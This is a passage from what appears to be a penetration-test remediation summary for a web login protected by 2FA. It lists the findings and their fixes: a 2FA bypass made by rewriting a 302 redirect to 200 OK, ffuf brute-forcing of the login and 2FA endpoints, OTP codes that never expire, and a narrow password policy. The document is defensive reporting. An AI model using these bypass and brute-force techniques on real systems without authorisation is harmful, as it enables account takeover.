Your most significant find was the ability to bypass the 2FA requirement by simply modifying the server's response from a `302 Redirect` to a `200 OK` and manually browsing to `profile.php`.

- **Vulnerability:** Broken Access Control / Incomplete Authentication State.
- **Protection:** Implement **Server-Side Session State Verification**. The application should not rely on the client-side browser to "follow" a redirect. Every protected page (like `profile.php`) must check if the session has a flag indicating `2FA_VERIFIED = TRUE`. If the flag is missing, the server should reject the request regardless of the URL accessed.

---

## 3. Lack of Rate Limiting / Anti-Automation

You were able to run thousands of requests using `ffuf` against the login and 2FA endpoints without being blocked or throttled.

- **Vulnerability:** Susceptibility to Brute-Force Attacks.
- **Protection:** * **Account Lockout:** Temporarily lock an account after 5 failed attempts.
    - **Rate Limiting:** Use IP-based throttling to limit the number of requests per second.
    - **CAPTCHA:** Trigger a CAPTCHA challenge after a few failed attempts to stop automated tools like `ffuf`.

---

## 4. Weak 2FA Logic (Missing Timeouts)

You noted that the `2fa.php` page does not apply a timeout. If the OTP does not expire quickly, an attacker has a much larger window to brute-force the code.

- **Vulnerability:** Improper Session/Token Timeout.
- **Protection:** Implement **Time-based One-Time Passwords (TOTP)** with a short expiry (e.g., 30–60 seconds). Once a new OTP is generated, the previous one must be immediately invalidated.

---

## 5. Password Policy "Hints"

While your custom wordlist logic was clever, the fact that the policy is **exactly** 12 characters and prohibits special characters actually makes the attacker's job easier by narrowing the search space.

- **Vulnerability:** Predictable Password Complexity Requirements.
- **Protection:** Update the policy to a **Minimum Length** (e.g., *at least* 12 characters) and **Allow Special Characters**. This increases the entropy exponentially.

---

### Summary of Recommendations for the Client

| Vulnerability | Severity | Primary Fix |
| --- | --- | --- |
| **2FA Bypass (Direct Access)** | **Critical** | Enforce session-state checks on every internal page. |
| **Brute-Force (Login/2FA)** | **High** | Implement Rate Limiting and CAPTCHAs. |
| **Username Enumeration** | **Medium** | Use unified/generic error messages. |
| **Weak 2FA Expiry** | **Medium** | Set OTP expiration to <60 seconds. |